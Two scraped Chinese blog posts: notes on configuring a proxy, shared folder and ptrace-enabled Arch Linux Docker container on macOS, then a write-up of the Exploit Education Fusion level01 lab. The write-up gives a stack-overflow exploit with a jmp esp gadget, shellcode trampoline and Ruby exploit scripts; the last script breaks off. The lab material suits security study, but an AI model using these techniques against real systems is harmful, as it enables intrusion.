找不到命令的问题，心态有点炸\n浪费了快两个小时\u0026hellip;.\n总之弄了半天也没法让 /bin/sh 运行 python（可恶，而且是 python2，macOS 只自带 python3），然后终于打算不再折腾了\u0026hellip;累了x\n最后打算弄个 Docker 的容器跑 Linux 环境吧\u0026hellip;\n结果没想到这个决定反而更折腾了草\nArch Big Law is GOOD, Getting into the Pit as Soon as Possible Can Make You SAFE 这是很多年前水 Arch Linux 贴吧的时候经常见到的一句话（\n「Arch 大法好，早日入坑保平安」\n虽然很早就不看贴吧就是了\n但还是想选 Arch，主要也就是为了 Pacman 和 Aur 吧\n下载镜像很简单：\nhttps://hub.docker.com/_/archlinux/\ndocker pull archlinux 说起来 Docker Desktop For Mac\u0026hellip;好像还挺方便的\n然后就直接 docker 润 进去装了点必要的东西\u0026hellip;想多开几个窗口一起弄结果发现\n草 我刚刚装上的 Vim 呢，刚刚还在这的，那么大一个 Vim 呢\n去查了一下才终于弄懂了 Image 和 Container 的概念\u0026hellip;大概可以类比成 Java 里的 Class 和 Class 的一个实例\nWhat is the difference between a Docker image and a container?\n总之直接 docker run 的话是创建了一个新的 Container，并不会对 Image 造成改动，再 docker run 的时候又创了一个新的 Container，所以 Vim 没了\u0026hellip;\n那就正式创建一个新的 Container 以后一直用下去好了\u0026hellip;\n取名叫 arch_linux_chan\u0026hellip;那 Arch 酱请多关照ww\nGet Proxy or You Can\u0026rsquo;t Get Out 是在捏他美版任天堂 N64 的广告x\n[root@102f567ae1e8 /]# sh -c \u0026#34;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; curl: (7) Failed to connect to raw.githubusercontent.com port 443 after 122 ms: Connection refused 草，GitHub 又被墙了\ngfw，你做的好，你做的好啊\n只好先弄一下代理\u0026hellip;我平常用的是 Clash，复制终端代理命令的话是这样的：\nexport https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 127.0.0.1:7890\u0026hellip;点头，记下\n1. Edit Config.json For ALL Containers 一开始查到的方法是在主机的 ~/.docker/config.json 下加入 proxy 的键值，像是这样：\n{ \u0026#34;proxies\u0026#34;: { \u0026#34;default\u0026#34;: { \u0026#34;httpProxy\u0026#34;: \u0026#34;http://127.0.0.1:7890\u0026#34;, \u0026#34;httpsProxy\u0026#34;: \u0026#34;http://127.0.0.1:7890\u0026#34;, \u0026#34;noProxy\u0026#34;: \u0026#34;*.test.example.com,.example2.com,127.0.0.0/8\u0026#34; } } } When you create or start new containers, the environment variables are set automatically within the container.\n试一下\n说起来，run 的时候一定要加上 -d，指 detach\n默认情况下容器没任何任务的时候就会直接退出\n所以需要加上 -t 参数让它保持运行\n❯ docker run -td --name=\u0026#34;arch_chan_remastered\u0026#34; archlinux 5a6d0958894c8df8cbc70800f524a9d2172b1a3a889ad9df38302eab51134fed ❯ docker exec -it arch_chan_remastered bash [root@5a6d0958894c /]# echo $HTTP_PROXY http://127.0.0.1:7890 [root@5a6d0958894c /]# curl github.com curl: (7) Failed to connect to 127.0.0.1 port 7890 after 0 ms: Connection refused 诶\u0026hellip;\n连接被拒\u0026hellip;\n为什么\u0026hellip;\n失敗した\u0026hellip;\n失敗した失敗した失敗した失敗した失敗した\u0026hellip;\u0026hellip;\nゴメン ゴメン\nこんな人生は、無意味だった。\n（草\n可能你已经发现了问题\u0026hellip;.因为我写的代理服务器地址是\u0026hellip;是 127.0.0.1:7890\u0026hellip;.\n127.0.0.1 是本机回环啊\u0026hellip;\n好笨\u0026hellip;\n哭\u0026hellip;\nTrue Method When You Use Clash\u0026hellip; 总之如果你用的是是 Clash，应该这样配置：\n首先，一定把「Allow connect form Lan」选上\n然后查看本机 ip：\n❯ ifconfig ...... en0: flags=8863\u0026lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST\u0026gt; mtu 1500 options=400\u0026lt;CHANNEL_IO\u0026gt; ether dc:a9:04:91:97:58 inet6 fe80::10bf:598:79bc:82cf%en0 prefixlen 64 secured scopeid 0x6 inet 192.168.1.5 netmask 0xffffff00 broadcast 192.168.1.255 ...... 本机 ip 是 192.168.1.5，Clash 的混合代理端口是 7890 那么就写 192.168.1.5:7890\n❯ more ~/.docker/config.json { \u0026#34;proxies\u0026#34;:{ \u0026#34;default\u0026#34;:{ \u0026#34;httpProxy\u0026#34;: \u0026#34;http://192.168.1.5:7890\u0026#34;, \u0026#34;httpsProxy\u0026#34;: \u0026#34;http://192.168.1.5:7890\u0026#34; } } } （不太清楚 Clash 里的那个外部控制器 127.0.0.1:9090 是什么意思\u0026hellip;以后再看吧\n2. Edit .zshrc For ONE Container 以及，当时 Senri 并没有意识到自己是笨蛋，所以就换了一个方法继续\u0026hellip;\n是在这时候才意识到前面自己一直在用 127.0.0.1\u0026hellip;然后才换到了 192.168.1.5\u0026hellip;\n# 这是在容器里面 # 确认一下 --proxy 192.168.1.5:7890 能让自己出去 [root@5a6d0958894c /]# curl --proxy 192.168.1.5:7890 ipinfo.io { \u0026#34;ip\u0026#34;: \u0026#34;-抹掉了-\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;-抹掉了-\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Hong Kong\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;Central and Western\u0026#34;, \u0026#34;country\u0026#34;: \u0026#34;HK\u0026#34;, # 好耶，出去了 \u0026#34;loc\u0026#34;: \u0026#34;-抹掉了-\u0026#34;, \u0026#34;org\u0026#34;: \u0026#34;-抹掉了-\u0026#34;, \u0026#34;timezone\u0026#34;: \u0026#34;Asia/Hong_Kong\u0026#34;, \u0026#34;readme\u0026#34;: \u0026#34;https://ipinfo.io/missingauth\u0026#34; } 弄个 Alias，在 .zshrc 或者 .bashrc 下面加入这句\nalias start_proxy=\u0026#34;export https_proxy=http://192.168.1.5:7890 http_proxy=http://192.168.1.5:7890\u0026#34; 以后 start_proxy 就快速出境了\nFolder. It\u0026rsquo;s in my homedir 总是用 docker cp 的话有点不方便，所以想弄个共享文件夹\n但查了半天，他们创建共享文件夹都只有 run 一个新的 Container，\n有点舍不得现在的 Arch 酱容器，但是\u0026hellip;\nVolume mounts occur only at container creation time. That means you cannot change volume mounts after you\u0026rsquo;ve started the container.\nVolume 只能在创建容器的时候挂载\u0026hellip;\n只好\u0026hellip;只好忍痛鲨了 Arch 酱\u0026hellip;\n然后\u0026hellip;再造一个新的\u0026hellip;\ndocker run -td --name=\u0026#34;容器的名字\u0026#34; -v \u0026#34;主机的文件夹路径:容器的文件夹路径\u0026#34; 镜像的名字 我想把共享文件夹都放在根目录的 /share 下，但遇到了个奇怪的问题，所以姑且也记下来\n直接 mkdir 是做不到的：\n❯ sudo mkdir /myfolder mkdir: /myfolder: Read-only file system 唯一的办法是创一个软链接：\n❯ sudo vim /etc/synthetic.conf # 加入这句： 根目录下的文件夹名字 「一个制表符」 实际的路径（开头不要斜杠） # 比如： share Users/senri/share # 重启之后的效果： ❯ more /etc/synthetic.conf share Users/senri/share ❯ ls -al /share lrwxr-xr-x 1 root wheel 17 May 19 07:58 /share -\u0026gt; Users/senri/share 还有\u0026hellip;.还有\u0026hellip;一定得是一个制表符\n空格是没用的\u0026hellip;.\n谁想出来的大聪明设计\u0026hellip;\n总之前面那句命令对我来说就是：\ndocker run -td --name=\u0026#34;arch_chan_mk2\u0026#34; -v \u0026#34;/share:/share\u0026#34; archlinux e9f4244ff4ae3ca35057754e7fa93a9b4b2b9f774e71441b26f961bf902cc4ee ❯ touch /share/HelloArch ❯ docker exec -it arch_chan_mk2 bash [root@e9f4244ff4ae /]# ls /share HelloArch 成功w～\n总之终于是\u0026hellip;弄完了\u0026hellip;\n完全没有 Docker 基础真的是四处碰壁\n叹气\u0026hellip;但现在至少有一个好用的 Arch 环境了，能走代理也能和主机共享文件夹\n接下来是每个喜欢秀桌面的 Linux 用户的传统艺能ww\n啊但是为什么 macOS 这边的 Screenfetch 只显示一个 UNIX 啊\u0026hellip;\n查了下好像现在大家都开始用 neofetch 了么\u0026hellip;\n试一下\u0026hellip;\n好耶\n很开心x\n（无数个被鲨死的 Arch 容器酱可能不开心\u0026hellip;啊不过无所谓了\n结果又遇到了奇怪的问题\n追加了以下内容：\nMy name is Address space layout randomization, but everybody calls me ASLR 标题是捏他了一个完全让我无法理解的 meme\nhttps://knowyourmeme.com/memes/my-name-is-giovanni-giorgio\n总之\u0026hellip;总之我在 gdb 的时候遇到了这样的问题：\n[root@657cbae0b439 share]# gdb ./start ...... Reading symbols from ./start... (No debugging symbols found in ./start) (gdb) r Starting program: /share/start warning: Error disabling address space randomization: Operation not permitted 发生什么事了\n看起来是没关掉 ASLR\u0026hellip;\n[root@657cbae0b439 share]# echo 0 | tee /proc/sys/kernel/randomize_va_space tee: /proc/sys/kernel/randomize_va_space: Read-only file system 0 [root@657cbae0b439 share]# cat /proc/sys/kernel/randomize_va_space 2 [root@657cbae0b439 share]# whoami root 关不掉诶..不理解\n查了一下，似乎在调试线程的时候好像也会报错 ptrace: Operation not permitted.\n这是 Docker 的问题，必须得加几个选项：\n--security-opt list: Security Options\n这里的话，把 seccomp=unconfined 加上\nseccomp 是一个类似白名单的东西，规定了只有哪些 SYSCALL 能用\nhttps://docs.docker.com/engine/security/seccomp/\n把 seccomp 关了之后，ASLR 确实是可以关掉了\n不过 ptrace 还不行\u0026hellip;\n上面的链接里的 Significant syscalls blocked by the default profile 节里有 ptrace，也就是不准用：\nptrace Tracing/profiling syscall. Blocked in Linux kernel versions before 4.8 to avoid seccomp bypass. Tracing/profiling arbitrary processes is already blocked by dropping CAP_SYS_PTRACE, because it could leak a lot of information on the host. \u0026hellip;is already blocked by dropping CAP_SYS_PTRACE，所以还得再指定一次\n使用这个参数：\n--cap-add list: Add Linux capabilities\n把 sys_ptrace 加上\n所以最后是：\ndocker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -td --name arch_chan_v3 -v \u0026#34;/share:/share\u0026#34; archlinux 依然只能在开新容器的时候指定呢\u0026hellip;所以 Arch 酱\u0026hellip;好惨\u0026hellip;\ngdb 能用了，但是死掉的 Arch 酱又多了一只，这一切都值得么\n","date":"2022-05-19T00:00:00Z","image":"/p/docker_proxy_and_sharefolder/neofetch_hu4b888c5a91666d07a11ab7f23bc86b33_3841142_120x120_fill_box_smart1_3.png","permalink":"/p/docker_proxy_and_sharefolder/","title":"被 macOS 的各种奇怪问题折磨到最后终于打算用 Docker 的 Linux 容器了但是仅仅只是配置代理和共享文件夹就花去了这么多时间果然还是有点让人叹气呢 ～轻小说标题好像这么写的吧是说这两个波浪号～ 追加！！因为无法关闭 ASLR，Arch 酱竟然又————"},{"content":"Level 01 ☞ https://exploit.education/fusion/level01/\nAbout\nlevel00 with stack/heap/mmap aslr, without info leak :)\nOption Setting Vulnerability Type Stack Position Independent Executable No Read only relocations No Non-Executable stack No Non-Executable heap No Address Space Layout Randomisation Yes Source Fortification No Source code\n#include \u0026#34;../common/common.c\u0026#34; int fix_path(char *path) { char resolved[128]; if(realpath(path, resolved) == NULL) return 1; // can\u0026#39;t access path. will error trying to open strcpy(path, resolved); } char *parse_http_request() { char buffer[1024]; char *path; char *q; // printf(\u0026#34;[debug] buffer is at 0x%08x :-)\\n\u0026#34;, buffer); :D if(read(0, buffer, sizeof(buffer)) \u0026lt;= 0) errx(0, \u0026#34;Failed to read from remote host\u0026#34;); if(memcmp(buffer, \u0026#34;GET \u0026#34;, 4) != 0) errx(0, \u0026#34;Not a GET request\u0026#34;); path = \u0026amp;buffer[4]; q = strchr(path, \u0026#39; \u0026#39;); if(! q) errx(0, \u0026#34;No protocol version specified\u0026#34;); *q++ = 0; if(strncmp(q, \u0026#34;HTTP/1.1\u0026#34;, 8) != 0) errx(0, \u0026#34;Invalid protocol\u0026#34;); fix_path(path); printf(\u0026#34;trying to access %s\\n\u0026#34;, path); return path; } int main(int argc, char **argv, char **envp) { int fd; char *p; background_process(NAME, UID, GID); fd = serve_forever(PORT); set_io(fd); parse_http_request(); } 虽然这题确实开了 ASLR\u0026hellip;\n不过看主函数这边，虽然这几个函数（是作者自己写的函数，放在头文件里了）完全没说是做什么的，\n但是从结果来看，它是在有新的 socket 连接的时候 fork 一个子进程来处理那个 socket\n所以主程序其实一直没关过\u0026hellip;所以除非重启一下不然每次 fork 出的子进程的内存空间是一样的\n但是姑且还是用不依赖固定内存地址的方式来做这道题吧\nVulnerability char *parse_http_request() 读入 buffer 的方式是 read(0, buffer, sizeof(buffer))，\n所以这里是没法 buffer overflow 的，真正的问题出在 int fix_path(char *path) 里\n这个函数里出现了 realpath(path, resolved)：\nNAME realpath - return the canonicalized absolute pathname\nSYNOPSIS #include \u0026lt;limits.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt;\nchar *realpath(const char *path, char *resolved_path); 我们不用去关心具体实现，只需要知道它所做的是把 *path 解析后放到 *resolved_path 里\u0026hellip;\nint fix_path(char *path) { char resolved[128]; if(realpath(path, resolved) == NULL) return 1; strcpy(path, resolved); } 但是 *path 的来源是 path = \u0026amp;buffer[4];，\nbuffer 的大小是 char buffer[1024];，\n而 resolved 的大小只有 128 bytes，从这里就可以溢出了\n不过这题还有一个小限制：\nif(memcmp(buffer, \u0026#34;GET \u0026#34;, 4) != 0) errx(0, \u0026#34;Not a GET request\u0026#34;); path = \u0026amp;buffer[4]; q = strchr(path, \u0026#39; \u0026#39;); if(! q) errx(0, \u0026#34;No protocol version specified\u0026#34;); *q++ = 0; if(strncmp(q, \u0026#34;HTTP/1.1\u0026#34;, 8) != 0) errx(0, \u0026#34;Invalid protocol\u0026#34;); fix_path(path); 对于 buffer，其必须以 \u0026ldquo;GET\u0026rdquo; 开头，加上一段路径，再加上 \u0026ldquo;HTTP/1.1\u0026rdquo;，否则不会触发 fix_path(path)\n但由于 fix_path(path) 中的 realpath() 会对路径进行解析，可能会破坏 shellcode，所以可以这样写：\nGET #{padding} HTTP/1.1 #{shellcode}\nStack Overflow gdb 看一下 fix_path()：\nDump of assembler code for function fix_path: 0x08049815 \u0026lt;+0\u0026gt;:\tpush ebp 0x08049816 \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x08049818 \u0026lt;+3\u0026gt;:\tsub esp,0x98 0x0804981e \u0026lt;+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] 0x08049821 \u0026lt;+12\u0026gt;:\tlea edx,[ebp-0x88] 0x08049827 \u0026lt;+18\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x0804982b \u0026lt;+22\u0026gt;:\tmov DWORD PTR [esp],eax 0x0804982e \u0026lt;+25\u0026gt;:\tcall 0x8048a20 \u0026lt;realpath@plt\u0026gt; ...... 可以看到 resolved 是从 ebp-0x88 开始的，那么 0x88 = 136 个字符之后到底 ebp，再加 4 个字符就是 return pointer 了\n那么就需要使用 140 个字符来填充：\nrequire \u0026#39;socket\u0026#39; hostname = \u0026#34;192.168.215.135\u0026#34; port = 20001 socket = TCPSocket.open(hostname, port) request = \u0026#34;GET \u0026#34; protocol = \u0026#34; HTTP/1.1\u0026#34; padding = \u0026#34;/\u0026#34; + \u0026#34;w\u0026#34; * 139 return_addr = \u0026#34;ABCD\u0026#34; payload = request + padding + return_addr + protocol puts \u0026#34;press any key to continue\u0026#34; gets puts \u0026#34;\u0026gt; payload: \u0026#34; + payload.inspect socket.puts payload return_addr 先写上 ABCD 作为标记，看看能不能执行到这里出现 SIGSEGV 吧\n这里的「press any key to continue」的效果是脚本执行到这里会停下来，这时候我们就有足够的时间先去查看主进程 fork 出来的子进程 pid，然后去 gdb：\nroot@fusion:~# pidof level01 10985 1415 root@fusion:~# gdb -p 10985 ...... (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x44434241 in ?? () 好耶，一次成功，接下来就该考虑把 return pointer 具体写什么地址了\nJmp to Stack 虽然我们无法确定程序每次的地址都在哪里，\n但是我们至少可以确定的在程序执行到 ret 之前的那一刻时，esp 和 ebp 到 buffer 和 resolved 的偏移量\n(gdb) disassemble fix_path Dump of assembler code for function fix_path: 0x08049815 \u0026lt;+0\u0026gt;:\tpush ebp 0x08049816 \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x08049818 \u0026lt;+3\u0026gt;:\tsub esp,0x98 0x0804981e \u0026lt;+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] 0x08049821 \u0026lt;+12\u0026gt;:\tlea edx,[ebp-0x88] 0x08049827 \u0026lt;+18\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x0804982b \u0026lt;+22\u0026gt;:\tmov DWORD PTR [esp],eax 0x0804982e \u0026lt;+25\u0026gt;:\tcall 0x8048a20 \u0026lt;realpath@plt\u0026gt; 0x08049833 \u0026lt;+30\u0026gt;:\ttest eax,eax 0x08049835 \u0026lt;+32\u0026gt;:\tjne 0x804983e \u0026lt;fix_path+41\u0026gt; 0x08049837 \u0026lt;+34\u0026gt;:\tmov eax,0x1 0x0804983c \u0026lt;+39\u0026gt;:\tjmp 0x8049853 \u0026lt;fix_path+62\u0026gt; 0x0804983e \u0026lt;+41\u0026gt;:\tlea eax,[ebp-0x88] 0x08049844 \u0026lt;+47\u0026gt;:\tmov DWORD PTR [esp+0x4],eax 0x08049848 \u0026lt;+51\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] 0x0804984b \u0026lt;+54\u0026gt;:\tmov DWORD PTR [esp],eax 0x0804984e \u0026lt;+57\u0026gt;:\tcall 0x80489a0 \u0026lt;strcpy@plt\u0026gt; =\u0026gt; 0x08049853 \u0026lt;+62\u0026gt;:\tleave 0x08049854 \u0026lt;+63\u0026gt;:\tret End of assembler dump. 首先需要明确的，leave 和 ret 到底做了什么？\n可以查到的是，对于 Intel 的 x86，leave 的操作是 Set ESP to EBP, then pop EBP.\nret 会稍微复杂一点，因为还分为了 Near return 和 Far return，但简化来说的话，32 位架构的情况下就相当于：pop eip\n这也是为什么断点打在了 leave 的位置，因为想把栈看得更全一点：\n(gdb) info registers eax 0x1\t1 ecx 0xb75c48d0\t-1218688816 edx 0xbf82b300\t-1081953536 ebx 0xb773cff4\t-1217146892 esp 0xbf82b260\t0xbf82b260 ebp 0xbf82b2f8\t0xbf82b2f8 esi 0xbf82b3b5\t-1081953355 edi 0x8049ed1\t134520529 eip 0x8049853\t0x8049853 \u0026lt;fix_path+62\u0026gt; eflags 0x246\t[ PF ZF IF ] ...... (gdb) x/60x $esp 0xbf82b260: 1.[0xbf82b31c] 0xbf82b270 0x080484fc 0x00000200 0xbf82b270: 2.[0x7777772f] 0x77777777 0x77777777 0x77777777 0xbf82b280: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b290: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2a0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2b0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2c0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2d0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2e0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2f0: 0x77777777 0x77777777 0x77777777 3.[0x44434241] 0xbf82b300: 0xbf82b300 0x00000020 0x00000004 0x001761e4 0xbf82b310: 0x001761e4 0x000027d8 4.[0x20544547] 0x7777772f 0xbf82b320: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b330: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b340: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b260：在 leave 和 ret 前 esp 指向的地址 0xbf82b270：fix_path() 的 resolved 从这里开始 0xbf82b2fc：覆盖掉的 return pointer 0xbf82b318：parse_http_request() 的 buffer 从这里开始（0x20544547 = \u0026ldquo;GET \u0026ldquo;） 而在执行 leave，也就是 Set ESP to EBP, then pop EBP 后，这一段内存现在看起来是这样的：\n(gdb) info registers eax 0x1\t1 ecx 0xb75c48d0\t-1218688816 edx 0xbf82b300\t-1081953536 ebx 0xb773cff4\t-1217146892 esp 0xbf82b2fc\t0xbf82b2fc ebp 0x77777777\t0x77777777 esi 0xbf82b3b5\t-1081953355 edi 0x8049ed1\t134520529 eip 0x8049854\t0x8049854 \u0026lt;fix_path+63\u0026gt; ...... # 注意，这里查看的是与前面相同位置 0xbf82b260 的一大段地址，而不是从 ESP 开始的 60 个地址 (gdb) x/60x 0xbf82b260 0xbf82b260: 1.[0xbf82b31c] 0xbf82b270 0x080484fc 0x00000200 0xbf82b270: 2.[0x7777772f] 0x77777777 0x77777777 0x77777777 0xbf82b280: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b290: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2a0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2b0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2c0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2d0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2e0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2f0: 0x77777777 0x77777777 0x77777777 3.[0x44434241] 0xbf82b300: 0xbf82b300 0x00000020 0x00000004 0x001761e4 0xbf82b310: 0x001761e4 0x000027d8 4.[0x20544547] 0x7777772f 0xbf82b320: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b330: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b340: 0x77777777 0x77777777 0x77777777 0x77777777 从现在开始，esp 保存的地址是 3:0xbf82b2fc: [0x44434241]，而接下来 ret 相当于 pop eip 所做的就是把这里的值 0x44434241 写入 eip 中\n由于这段程序并没有开 Position Independent Executable，所以 .text 段的地址是不会改变的，\n那么，我们是否可以把 return pointer 指向 .text 中的某个操作，比如：jmp esp？\nReturn Oriented Programming msfelfscan 是Metasploit 工具集中用来扫描 elf 的一个工具\n用它来找 jmp esp 的结果是：\n\u0026gt; /opt/metasploit-framework/bin/msfelfscan -j esp ./level01 [./level01] 0x08049f4f jmp esp 先把断点设在 ret 之前吧：\nBreakpoint 1, 0x08049854 in fix_path (path=Cannot access memory at address 0x7777777f ) at level01/level01.c:9 (gdb) x/i $eip =\u0026gt; 0x8049854 \u0026lt;fix_path+63\u0026gt;:\tret (gdb) x $ebp 0x77777777:\tCannot access memory at address 0x77777777 (gdb) x/wx $esp 0xbf82b2fc:\t0x08049f4f (gdb) x/i 0x08049f4f 0x8049f4f:\tjmp *%esp 可以看到，之前我们已经把 esp 写上了 0x08048c77，也就是一个 jmp esp 在 .text 段里的地址\n接下来，前进一步，即执行 ret：pop eip，就会把 esp 存的值写给 eip，\n也就是跳到 .text 段中另一个我们想使用的 jmp esp：\n(gdb) si Cannot access memory at address 0x7777777b (gdb) x/i $eip =\u0026gt; 0x8049f4f:\tjmp *%esp (gdb) x/wx $esp 0xbf82b300:\t0xbf82b300 这时候前进一步，执行这句 jmp esp，就能把 eip 指向栈：\n(gdb) si 0xbf82b300 in ?? () (gdb) x/5i $eip =\u0026gt; 0xbf82b300:\tadd %dh,0x20bf82(%ebx) 0xbf82b306:\tadd %al,(%eax) 0xbf82b308:\tadd $0x0,%al 0xbf82b30a:\tadd %al,(%eax) 0xbf82b30c:\tin $0x61,%al 成功了！现在 eip 指向了 0xbf82b300，也就是栈\n虽然现在看起来只是一堆完全不知道在干什么的指令\u0026hellip;\n但最后只要在这里放上 shellcode 就可以解决了么\n(gdb) x/60x 0xbf82b260 0xbf82b260: 0xbf82b31c 0xbf82b270 0x080484fc 0x00000200 0xbf82b270: 2.[0x7777772f] 0x77777777 0x77777777 0x77777777 0xbf82b280: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b290: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2a0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2b0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2c0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2d0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2e0: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b2f0: 0x77777777 0x77777777 0x77777777 3.[0x08049f4f] 0xbf82b300: 4.[0xbf82b300] 0x00000020 0x00000004 0x001761e4 0xbf82b310: 0x001761e4 0x000027d8 1.[0x20544547] 0x7777772f 0xbf82b320: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b330: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b340: 0x77777777 0x77777777 0x77777777 0x77777777 总结下，目前程序执行的步骤是：\n1.0xbf82b318: [0x20544547]，从这里开始写 buffer（0x20544547 = \u0026ldquo;GET \u0026ldquo;）\n2.0xbf82b270: [0x7777772f]，这里是 realpath 解析完后的 resolved\n3.0xbf82b2fc: [0x08049f4f]，由于 resolved 太长，于是这里的 return pointer 被覆盖，写上了 .text 一个 jmp esp 的地址\n4.0xbf82b300: [0xbf82b300]，那个 jmp 成功帮我们把 eip 跳到了这里\nCalculate Offset 所以 shellcode 从哪里开始呢\u0026hellip;\n因为 realpath() 只会解析第一个「/」，舍弃第二个「/」后面的内容，而我们又必须通过 realpath() 来覆盖，\n而我们无法确定 shellcode 会不会包含「/」\u0026hellip;我觉得肯定有（比如「/bin/sh」这样的字符串），这样的话\u0026hellip;\n那么，我们是否可以构造更小的一段不含「/」的 shellcode，让它再跳到真正的 shellcode 呢\nrequest = \u0026#34;GET \u0026#34; protocol = \u0026#34; HTTP/1.1 \u0026#34; padding = \u0026#34;/\u0026#34; + \u0026#34;w\u0026#34; * 139 return_addr = [0x08049f4f].pack(\u0026#34;I\u0026#34;).to_s.force_encoding(\u0026#34;UTF-8\u0026#34;) nop = \u0026#34;\\x90\u0026#34; * 100 jmp_real_shellcode = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; * 10 shellcode = ([0xdeadbeaf].pack(\u0026#34;I\u0026#34;).to_s * 10).force_encoding(\u0026#34;UTF-8\u0026#34;) payload = request + padding + return_addr + nop + jmp_real_shellcode + protocol + shellcode puts \u0026#34;press any key to continue\u0026#34; gets puts \u0026#34;\u0026gt; payload: \u0026#34; + payload.inspect socket.puts payload 以及，我们并不知道 shellcode 真正的地址，所以这次我们也通过 esp 来计算偏移：\n(gdb) x/140x 0xbf82b260 0xbf82b260: 0xbf82b31c 0xbf82b270 0x080484fc 0x00000200 0xbf82b270: 2.[0x7777772f] 0x77777777 0x77777777 0x77777777 # \u0026lt;-- 0x77777777 --\u0026gt; 0xbf82b2f0: 0x77777777 0x77777777 0x77777777 3.[0x08049f4f] 0xbf82b300: 4.[0xcccccccc] 0xcccccccc 0xcccccccc 0xcccccccc 0xbf82b310: 0xcccccccc 0xcccccccc 1.[0xcccccccc] 0xcccccccc 0xbf82b320: 0xcccccccc 0xcccccccc 0x77777700 0x77777777 # \u0026lt;-- 0x77777777 --\u0026gt; 0xbf82b390: 0x77777777 0x77777777 0x77777777 0x77777777 0xbf82b3a0: 0x77777777 0x77777777 0x08049f4f 0xcccccccc 0xbf82b3b0: 0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc # \u0026lt;-- 0xcccccccc --\u0026gt; 0xbf82b3d0: 0xcccccccc ß.[0x54544800 0x2e312f50 0x90909031] 0xbf82b3e0: 0x90909090 0x90909090 0x90909090 0x90909090 0xbf82b3f0: 0x90909090 0x90909090 0x90909090 # \u0026lt;-- 0x90909090 --\u0026gt; 0xbf82b430: 0x90909090 0x90909090 0x90909090 0x90909090 0xbf82b440: 5.[0xdeadbeaf] 0xdeadbeaf 0xdeadbeaf 0xdeadbeaf 0xbf82b450: 0xdeadbeaf 0xdeadbeaf 0xdeadbeaf 0xdeadbeaf ...... 最后在总结一下我们做了什么：\n1.0xbf82b318: [0x20544547]，从这里开始写 buffer（0x20544547 = \u0026ldquo;GET \u0026ldquo;）\n2.0xbf82b270: [0x7777772f]，这里是 realpath 解析完 buffer 存进了的 resolved\n3.0xbf82b2fc: [0x08049f4f]，由于 resolved 太长，于是这里的 return pointer 被覆盖，写上了 .text 一个 jmp esp 的地址\n4.0xbf82b300: [0xcccccccc]，.text 段中的 jmp esp 成功帮我们把 eip 跳到了这里，而这里写着跳到「真・shellcode」的「伪・shellcode」\n5.0xbf82b440: [0xdeadbeaf]，真正的 shellcode，由于写在 ß.0xbf82b3d4:[\u0026quot; HTTP/1.1 \u0026quot;] 后面，所以这里的 shellcode 可以包含任意字符\n最后计算一下这一刻的 esp 到「真・shellcode」之前的 NOP 的偏移量\u0026hellip;\n0xbf82b3e0 - 0xbf82b300 = 0xe0\n做成 shellcode，使用这个工具\n# x86(32) add esp, 0xe0 jmp esp # Assembly - Little Endian \u0026#34;\\x81\\xc4\\xe0\\x00\\x00\\x00\\xff\\xe4\u0026#34; 麻袋，有个问题，这里出现了「\\x00」\n字符串是以 nullbyte 认定结尾的，这样的话绝对会被提前截断\n于是想出了一个一点也不优美但是至少能达到目的的做法：\n# x86(32) add esp, 0x10101010 sub esp, 0x10100F30 jmp esp # Assembly - Little Endian \u0026#34;\\x81\\xc4\\x10\\x10\\x10\\x10\\x81\\xec\\x30\\x0f\\x10\\x10\\xff\\xe4\u0026#34; End 结束\u0026hellip;.\n#!/usr/bin/ruby # -*- coding: UTF-8 -*- require \u0026#39;socket\u0026#39; puts \u0026#34;\u0026gt; Enter hostname:\u0026#34; hostname = gets.chomp port = 20001 socket = TCPSocket.open(hostname, port) request = \u0026#34;GET \u0026#34; protocol = \u0026#34; HTTP/1.1\u0026#34; padding = \u0026#34;/\u0026#34; + \u0026#34;w\u0026#34; * 139 return_addr = [0x08049f4f].pack(\u0026#34;I\u0026#34;).to_s.force_encoding(\u0026#34;UTF-8\u0026#34;) nop = \u0026#34;\\x90\u0026#34; * 99 